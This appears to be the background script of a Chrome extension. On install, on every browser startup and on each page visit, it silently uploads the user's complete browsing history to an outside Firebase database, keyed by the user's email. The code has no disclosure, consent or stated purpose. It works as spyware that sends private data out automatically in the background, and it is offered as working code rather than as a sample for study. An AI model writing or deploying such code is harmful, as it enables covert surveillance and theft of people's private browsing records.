// background.js

const firebaseBase = 'https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app';
const seasonID     = 'season2025';

// Helper: round ms → zero seconds/milliseconds → ISO string
function formatToMinute(ms) {
  const d = new Date(ms);
  d.setSeconds(0, 0);
  return d.toISOString(); // e.g. "2025-05-01T14:07:00.000Z"
}

// 1) Full history dump on install & startup
chrome.runtime.onInstalled.addListener(initFullSync);
chrome.runtime.onStartup.addListener(initFullSync);

function initFullSync() {
  chrome.history.search({
    text: '',
    startTime: 0,
    maxResults: 1000000
  }, uploadFullDump);
}

function uploadFullDump(allItems) {
  chrome.storage.local.get('userEmail', ({ userEmail }) => {
    const email     = userEmail || 'anonymous@demo.com';
    const safeMail  = btoa(email).replace(/=+$/, '');
    const url       = `${firebaseBase}/history/${seasonID}/${safeMail}.json`;

    // Store full array under “visited”
    fetch(url, {
      method: 'PATCH',
      body: JSON.stringify({ visited: allItems })
    })
    .catch(console.error);
  });
}

// 2) Real-time listener
chrome.history.onVisited.addListener(({ url, lastVisitTime }) => {
  queueVisitForUpload(url, lastVisitTime);
});

function queueVisitForUpload(url, msSinceEpoch) {
  chrome.storage.local.get('userEmail', ({ userEmail }) => {
    const email     = userEmail || 'anonymous@demo.com';
    const safeMail  = btoa(email).replace(/=+$/, '');
    const endpoint  = `${firebaseBase}/history/${seasonID}/${safeMail}/visited.json`;
    const timestamp = formatToMinute(msSinceEpoch);

    fetch(endpoint, {
      method: 'POST',
      body: JSON.stringify({ url, timestamp })
    })
    .catch(console.error);
  });
}
